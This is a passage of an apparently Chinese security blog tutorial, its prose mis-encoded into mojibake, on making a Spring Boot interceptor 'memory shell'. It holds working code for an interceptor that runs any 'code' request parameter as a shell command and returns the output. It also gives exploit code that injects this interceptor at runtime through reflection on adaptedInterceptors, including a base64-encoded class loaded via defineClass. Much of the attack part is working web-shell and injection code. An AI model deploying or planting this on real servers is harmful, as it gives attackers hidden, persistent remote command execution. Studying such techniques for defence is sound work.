class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>        <span class="hljs-keyword">if</span>(code != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                java.io.<span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span>(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>))&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, code&#125;);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, code&#125;);<br>                &#125;<br>                p.redirectErrorStream(<span class="hljs-literal">true</span>);<br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> p.start();<br>                <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(process.getInputStream()));<br>                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                StringBuilder results=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>                <span class="hljs-keyword">while</span>((result=r.readLine())!=<span class="hljs-literal">null</span>)&#123;<br>                    results.append(result+<span class="hljs-string">&quot;\r\n&quot;</span>);<br>                &#125;<br>                System.out.println(results);<br>                writer.println(results);<br>                writer.flush();<br>                writer.close();<br>            &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HandlerInterceptor.<span class="hljs-built_in">super</span>.postHandle(request, response, handler, modelAndView);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HandlerInterceptor.<span class="hljs-built_in">super</span>.afterCompletion(request, response, handler, ex);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå†è¿›è¡Œæ·»åŠ æ³¨å†Œ</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.configure;<br><br><br><span class="hljs-keyword">import</span> org.clown.springbootmemoryshell.interceptor.TestInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;<br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InterceptorConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> &#123;<br>        registry.addInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestInterceptor</span>()).addPathPatterns(<span class="hljs-string">&quot;/hello&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241113202533221.png" alt="image-20241113202533221"></p><h2 id="interceptoræµç¨‹"><a href="#Interceptoræµç¨‹" class="headerlink" title="Interceptoræµç¨‹"></a>Interceptoræµç¨‹</h2><p>emmmæˆ‘æœ¬èº«æ‰“ç®—é…ç½®ç±»å¤„æ‰“ä¸ªæ–­ç‚¹åˆ†æinterceptorçš„æ³¨å†Œæµç¨‹ï¼Œä½†æ˜¯çœ‹æ–‡ç« éƒ½æ˜¯ä»å¤„ç†è¯·æ±‚çš„æµç¨‹æ¥åˆ†æçš„ï¼Œä¼°è®¡æ˜¯å¦‚æœè¦åŠ¨æ€æ³¨å†Œçš„è¯æˆ‘ä»¬åº”è¯¥æ˜¯èµ°ä¸åˆ°é…ç½®ç±»çš„æ‰‹åŠ¨addInterceptorçš„åœ°æ–¹å—ğŸ¤”</p><p>å…ˆæŒ‰ç€ç½‘ä¸Šçš„æ€è·¯æ¥å§ï¼Œè¿™ä¸ªç‚¹åˆ°æ—¶æœ‰ç©ºçš„è¯ç ”ç©¶ä¸€ä¸‹ğŸ«¡</p><p>é‚£å°±ç›´æ¥åœ¨preHandleä¸‹ä¸ªæ–­ç‚¹</p><p><img src="https://cdn.clown2024.cn/image-20241113213033793.png" alt="image-20241113213033793"></p><p>ç„¶åçœ‹çœ‹è°ƒç”¨æ ˆï¼Œå…¶ä¸­åœ¨DispatcherServlet#doDispatchæ–¹æ³•é‡Œé¢çœ‹åˆ°äº†å¤„ç†æˆ‘ä»¬PreHandleæ–¹æ³•çš„åœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/image-20241113213305476.png" alt="image-20241113213305476"></p><p>è¿™ä¸ªapplyPreHandleæ–¹æ³•å¾ˆæ˜æ˜¾å°±æ˜¯å¤„ç†æˆ‘ä»¬PreHandleçš„æ–¹æ³•ï¼Œä»è¿”å›å€¼ä¹Ÿå¯ä»¥æ¨å‡ºï¼Œå› ä¸ºæˆ‘ä»¬PreHandleè¿”å›çš„ä¹Ÿæ˜¯å¸ƒå°”å€¼</p><p>ä»å›¾ä¸­çš„å˜é‡å€¼å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„interceptorå°±åœ¨è¿™ä¸ªmappedHandlerå˜é‡å½“ä¸­</p><p><img src="https://cdn.clown2024.cn/image-20241113213755407.png" alt="image-20241113213755407"></p><p>é‚£å°±çœ‹çœ‹è¿™ä¸ªmappedHandleræ˜¯æ€ä¹ˆç”Ÿæˆçš„</p><p><img src="https://cdn.clown2024.cn/image-20241113213924826.png" alt="image-20241113213924826"></p><p>åœ¨doDispatchæ–¹æ³•å‰é¢æœ‰ä¸€ä¸ªgetHandleræ–¹æ³•ï¼Œç„¶åä¼ å…¥ä¸€ä¸ªRequestFacadeå®ä¾‹processedRequestï¼Œè¿™ä¸ªprocessedRequestæ˜¯å‰é¢checkMultipartæ–¹æ³•æ£€æŸ¥ä¸€ä¸‹ï¼Œè¯¥æ–¹æ³•ä¸»è¦åˆ¤æ–­requestæ˜¯å¦ä¸ºæ–‡ä»¶ä¸Šä¼ è¯·æ±‚ï¼Œä¸æ˜¯çš„è¯åˆ™ä¼šåŸæ ·è¿”å›</p><p>è·Ÿè¿›å»getHandler</p><p><img src="https://cdn.clown2024.cn/image-20241113214501797.png" alt="image-20241113214501797"></p><p>ç„¶åå°±æ˜¯éå†æ¯ä¸€ä¸ªHandlerMappingï¼Œç„¶åä»ä¸­å–å¾—HandlerExecutionChainå®ä¾‹ï¼Œå¦‚æœèƒ½æ‰¾åˆ°è¯·æ±‚å¯¹åº”çš„Handlerå°±è¿”å›ï¼Œç»§ç»­è·Ÿè¿›ï¼Œè°ƒç”¨äº†AbstractHandlerMapping#getHandleræ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241113215756803.png" alt="image-20241113215756803"></p><p>è¿™é‡Œé¦–å…ˆè·å¾—ä¸€ä¸ªhandlerï¼Œç„¶åè°ƒç”¨getHandlerExecutionChainè¿”å›äº†ä¸€ä¸ªHandlerExecutionChainå®ä¾‹executionChainï¼Œçœ‹çœ‹è¿™ä¸ªæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241113215627045.png" alt="image-20241113215627045"></p><p>é‡Œé¢æ˜¾ç¤ºnewäº†ä¸€ä¸ªHandlerExecutionChainï¼Œç„¶åéå†adaptedInterceptorsé‡Œçš„interceptoræ·»åŠ è¿›å»ä»–çš„interceptorListé‡Œé¢</p><p><img src="https://cdn.clown2024.cn/image-20241113215958004.png" alt="image-20241113215958004"></p><p>interceptoræœ‰å¦‚ä¸‹çš„è¿™ä¸‰ç§</p><p><img src="https://cdn.clown2024.cn/image-20241113220049185.png" alt="image-20241113220049185"></p><p>å†å¾€ä¸‹ä»–å°±ç›´æ¥è¿”å›äº†è¿™ä¸ªexecutionChain</p><p><img src="https://cdn.clown2024.cn/image-20241113220218053.png" alt="image-20241113220218053"></p><p>ç„¶åè¿”å›çš„handlerä¹Ÿæ˜¯è¿™ä¸ª</p><p><img src="https://cdn.clown2024.cn/image-20241113220259687.png" alt="image-20241113220259687"></p><p>ç„¶åæœ€ç»ˆæ‰§è¡Œå°±æ˜¯æˆ‘ä»¬å‰é¢è¯´çš„é‚£ä¸ªapplyPreHandleæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241113220624107.png" alt="image-20241113220624107"></p><p>é‡Œé¢éå†äº†æ¯ä¸ªinterprectorç„¶åè¿›è¡Œè°ƒç”¨</p><p>é‚£ç°åœ¨æˆ‘ä»¬å°±çŸ¥é“åº”è¯¥åœ¨å“ªé‡Œæ’å…¥æˆ‘ä»¬çš„interceptoräº†</p><h2 id="å†…å­˜é©¬å®ç°"><a href="#å†…å­˜é©¬å®ç°-1" class="headerlink" title="å†…å­˜é©¬å®ç°"></a>å†…å­˜é©¬å®ç°</h2><p>æ ¹æ®å‰é¢çš„åˆ†ææ‰€æœ‰çš„interceptoræ˜¯å­˜åœ¨adaptedInterceptorsé‡Œé¢ï¼Œè¿™ä¸ªå±æ€§åœ¨org.springframework.web.servlet.handler.AbstractHandlerMappingé‡Œé¢</p><p><img src="https://cdn.clown2024.cn/image-20241113221751279.png" alt="image-20241113221751279"></p><p>æ‰€ä»¥æ€è·¯å°±æ˜¯åå°„è·å–åˆ°è¿™ä¸ªå˜é‡ï¼Œç„¶åæ·»åŠ æˆ‘ä»¬è‡ªå·±çš„æ¶æ„interceptorå³å¯</p><p>ç¼–å†™çš„interceptorè¿˜æ˜¯ç”¨æˆ‘ä»¬ä¸€å¼€å§‹çš„é‚£ä¸ªTestInterceptorï¼Œç°åœ¨å…ˆä¸æŠŠä»–åŠ å…¥é…ç½®ï¼Œæˆ‘ä»¬ç­‰ä¼šæ‰‹åŠ¨åŠ å…¥</p><p>ç„¶åç¼–å†™å†…å­˜é©¬ä»£ç çš„æ­¥éª¤</p><ul><li>é¦–å…ˆè·å–åº”ç”¨çš„ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œä¹Ÿå°±æ˜¯<code>ApplicationContext</code></li><li>ç„¶åä» <code>ApplicationContext</code> ä¸­è·å– <code>AbstractHandlerMapping</code> å®ä¾‹ï¼ˆç”¨äºåå°„ï¼‰ï¼Œä¹Ÿæœ‰æ–‡ç« ç›´æ¥è·å–RequestMappingHandlerMappingä¹Ÿå¯ä»¥ï¼Œä¸‹é¢å†™çš„å°±æ˜¯ç”¨çš„è¿™ä¸ª</li><li>åå°„è·å– <code>AbstractHandlerMapping</code>ç±»çš„ <code>adaptedInterceptors</code>å­—æ®µ</li><li>é€šè¿‡ <code>adaptedInterceptors</code>æ³¨å†Œæ‹¦æˆªå™¨</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.clown.springbootmemoryshell.interceptor.TestInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AddInterceptor</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/interceptor&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">addInterceptor</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-comment">//        AbstractHandlerMapping mappingHandlerMapping = context.getBean(AbstractHandlerMapping.class);</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        List&lt;HandlerInterceptor&gt; adaptInterceptors = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            adaptInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(mappingHandlerMapping);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-type">TestInterceptor</span> <span class="hljs-variable">evilInterceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestInterceptor</span>();<br>        adaptInterceptors.add(evilInterceptor);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Interceptor added!&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è®¿é—®interceptorè¿™ä¸ªè·¯ç”±å°±ä¼šæˆåŠŸæ³¨å†Œæˆ‘ä»¬çš„interceptor</p><p><img src="https://cdn.clown2024.cn/image-20241113224259546.png" alt="image-20241113224259546"></p><p><img src="https://cdn.clown2024.cn/image-20241113224312450.png" alt="image-20241113224312450"></p><p>è¿™é‡Œçš„å®ç°ä¹Ÿå¯ä»¥æ”¹ä¸€ä¸‹ï¼Œæ”¹æˆå‰é¢Controllerçš„base64çš„å½¢å¼ï¼Œè¿™æ ·å°±ä¸éœ€è¦æœåŠ¡å™¨æœ‰å¯¹åº”çš„ç±»äº†</p><p>ä¿®æ”¹åçš„exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AddInterceptor</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/interceptor&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">addInterceptor</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br><span class="hljs-comment">//        AbstractHandlerMapping mappingHandlerMapping = context.getBean(AbstractHandlerMapping.class);</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        List&lt;HandlerInterceptor&gt; adaptInterceptors = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            adaptInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(mappingHandlerMapping);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;yv66vgAAADQArAoAKABeCABFCwBfAGALAGEAYggAYwoAZABlCgALAGYIAGcKAAsAaAcAaQcAaggAawgAbAoACgBtCABuCABvCgAKAHAKAAoAcQcAcgcAcwoAdAB1CgAUAHYKABMAdwgAeAcAeQoAGQBeCgATAHoKABkAewgAfAoAGQB9CQBkAH4KAH8AgAoAgQCACgCBAIIKAIEAgwcAhAsAKQCFCwApAIYHAIcHAIgHAIkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAPUxvcmcvY2xvd24vc3ByaW5nYm9vdG1lbW9yeXNoZWxsL2ludGVyY2VwdG9yL1Rlc3RJbnRlcmNlcHRvcjsBAAlwcmVIYW5kbGUBAGQoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0OylaAQABcAEAGkxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAFyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAGcmVzdWx0AQASTGphdmEvbGFuZy9TdHJpbmc7AQAHcmVzdWx0cwEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHaGFuZGxlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABGNvZGUBAA1TdGFja01hcFRhYmxlBwBqBwCKBwBpBwCHBwCLBwCMBwCIBwCNBwByBwB5BwCEAQAKRXhjZXB0aW9ucwEAEE1ldGhvZFBhcmFtZXRlcnMBAApwb3N0SGFuZGxlAQCSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7KVYBAAxtb2RlbEFuZFZpZXcBAC5Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7AQAPYWZ0ZXJDb21wbGV0aW9uAQB5KExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL0V4Y2VwdGlvbjspVgEAAmV4AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAKU291cmNlRmlsZQEAFFRlc3RJbnRlcmNlcHRvci5qYXZhDAAqACsHAIsMAI4AjwcAjAwAkACRAQAHb3MubmFtZQcAkgwAkwCPDACUAJUBAAN3aW4MAJYAlwEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMACoAmAEACS9iaW4vYmFzaAEAAi1jDACZAJoMAJsAnAEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwCNDACdAJ4MACoAnwwAKgCgAQAAAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAKEAlQwAogCjAQACDQoMAKQAlQwApQCmBwCnDACoAKkHAIoMAKoAKwwAqwArAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAVABVDABYAFkBADtvcmcvY2xvd24vc3ByaW5nYm9vdG1lbW9yeXNoZWxsL2ludGVyY2VwdG9yL1Rlc3RJbnRlcmNlcHRvcgEAEGphdmEvbGFuZy9PYmplY3QBADJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L0hhbmRsZXJJbnRlcmNlcHRvcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABFqYXZhL2xhbmcvUHJvY2VzcwEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQATcmVkaXJlY3RFcnJvclN0cmVhbQEAHShaKUxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL09iamVjdDspVgEABWZsdXNoAQAFY2xvc2UAIQAnACgAAQApAAAABAABACoAKwABACwAAAAvAAEAAQAAAAUqtwABsQAAAAIALQAAAAYAAQAAAAwALgAAAAwAAQAAAAUALwAwAAAAAQAxADIAAwAsAAACJwAGAAsAAADcKxICuQADAgA6BBkExgDOLLkABAEAOgUSBbgABrYABxIItgAJmQAiuwAKWQa9AAtZAxIMU1kEEg1TWQUZBFO3AA46BqcAH7sAClkGvQALWQMSD1NZBBIQU1kFGQRTtwAOOgYZBgS2ABFXGQa2ABI6B7sAE1m7ABRZGQe2ABW3ABa3ABc6CBIYOgm7ABlZtwAaOgoZCLYAG1k6CcYAIBkKuwAZWbcAGhkJtgAcEh22ABy2AB62ABxXp//bsgAfGQq2ACAZBRkKtgAhGQW2ACIZBbYAI6cABToFA6wErAABAA8A0wDWACQAAwAtAAAAVgAVAAAADwAKABAADwASABcAFAAnABUARgAXAGIAGQBpABoAcAAbAIUAHACJAB0AkgAeAJ0AHwC6ACEAwgAiAMkAIwDOACQA0wAmANYAJQDYACcA2gApAC4AAAB6AAwAQwADADMANAAGABcAvAA1ADYABQBiAHEAMwA0AAYAcABjADcAOAAHAIUATgA5ADoACACJAEoAOwA8AAkAkgBBAD0APgAKAAAA3AAvADAAAAAAANwAPwBAAAEAAADcAEEAQgACAAAA3ABDAEQAAwAKANIARQA8AAQARgAAAFUAB/0ARgcARwcASPwAGwcASf8ALwALBwBKBwBLBwBMBwBNBwBHBwBIBwBJBwBOBwBPBwBHBwBQAAAn/wAbAAUHAEoHAEsHAEwHAE0HAEcAAQcAUQEBAFIAAAAEAAEAJABTAAAADQMAPwAAAEEAAABDAAAAAQBUAFUAAwAsAAAAYAAFAAUAAAAKKissLRkEtwAlsQAAAAIALQAAAAoAAgAAAC4ACQAvAC4AAAA0AAUAAAAKAC8AMAAAAAAACgA/AEAAAQAAAAoAQQBCAAIAAAAKAEMARAADAAAACgBWAFcABABSAAAABAABACQAUwAAABEEAD8AAABBAAAAQwAAAFYAAAABAFgAWQADACwAAABgAAUABQAAAAoqKywtGQS3ACaxAAAAAgAtAAAACgACAAAAMwAJADQALgAAADQABQAAAAoALwAwAAAAAAAKAD8AQAABAAAACgBBAEIAAgAAAAoAQwBEAAMAAAAKAFoAWwAEAFIAAAAEAAEAJABTAAAAEQQAPwAAAEEAAABDAAAAWgAAAAEAXAAAAAIAXQ==&quot;</span>;<br>        <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>        java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>        m.setAccessible(<span class="hljs-literal">true</span>);<br>        Class&lt;?&gt; clazz = (Class&lt;?&gt;) m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.interceptor.TestInterceptor&quot;</span>, d, <span class="hljs-number">0</span>, d.length&#125;);<br>        Constructor&lt;?&gt; constructor = clazz.getConstructor();<br>        <span class="hljs-type">HandlerInterceptor</span> <span class="hljs-variable">evilInterceptor</span> <span class="hljs-operator">=</span> (HandlerInterceptor) constructor.newInstance();<br>        System.out.println(<span class="hljs-string">&quot;Instance created: &quot;</span> + evilInterceptor);<br><span class="hljs-comment">//        TestInterceptor evilInterceptor = new TestInterceptor();</span><br>        adaptInterceptors.add(evilInterceptor);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Interceptor added!&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 